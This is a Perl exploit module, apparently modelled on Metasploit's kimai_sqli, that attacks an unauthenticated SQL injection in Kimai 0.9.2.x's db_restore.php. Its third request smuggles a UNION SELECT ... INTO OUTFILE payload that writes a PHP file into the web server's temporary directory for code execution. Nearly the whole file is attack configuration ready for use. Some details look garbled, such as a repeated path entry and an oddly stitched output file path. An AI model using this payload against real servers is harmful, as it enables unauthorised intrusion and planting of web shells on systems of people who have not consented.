package KIMAI::MSF::KimaiSqli;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "KimaiSqli";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "DESCRIPTION" => "

          This module exploits a SQL injection vulnerability in Kimai version

        0.9.2.x. The 'db_restore.php' file allows unauthenticated users to

        execute arbitrary SQL queries. This module writes a PHP payload to

        disk if the following conditions are met: The PHP configuration must

        have 'display_errors' enabled, Kimai must be configured to use a

        MySQL database running on localhost; and the MySQL user must have

        write permission to the Kimai 'temporary' directory.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "kimai_sqli",
  "OSVDB" => 93547,
  "PATH" => "db_restore.php?",
  "PATHS" => [
    "db_restore.php",
    "db_restore.php",
    "db_restore.php",
    "kimai/",
    "var/www/",
  ],
  "PAYLOAD" => "",
  "THE MYSQL TABLE TITLE PREFIX STRING FOR KIMAI TABLES" => "kimai_",
  VARIABLES => {
    'ID' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The path to the web server document root directory",
  VALUE => "/var/www/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'db_restore.php',
      PAYLOAD      => 'submit=create%20backup',
      TEXT   => 'Sending Exploit #2 Request : [POST] /db_restore.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT3 => {
      METHOD       => 'POST',
      PATH   => 'db_restore.php',
      PAYLOAD      => 'submit=recover&dates%5b%5d=_var%20UNION%20SELECT%20%27%3c%3fphp%20__PAYLOAD__%20%3f%3e%27%20INTO%20OUTFILE%20%27/var/www/UNIX/KIMAI/KimaiSqli//temporary/0IRnBDU3PXJ0kIy.php%27%3b--%20',
      TEXT   => 'Sending Exploit #3 Request : [POST] /db_restore.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT4 => {
      METHOD       => 'POST',
      PATH   => 'db_restore.php',
      PAYLOAD      => 'submit=delete&dates%5b%5d=',
      TEXT   => 'Sending Exploit #4 Request : [POST] /db_restore.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
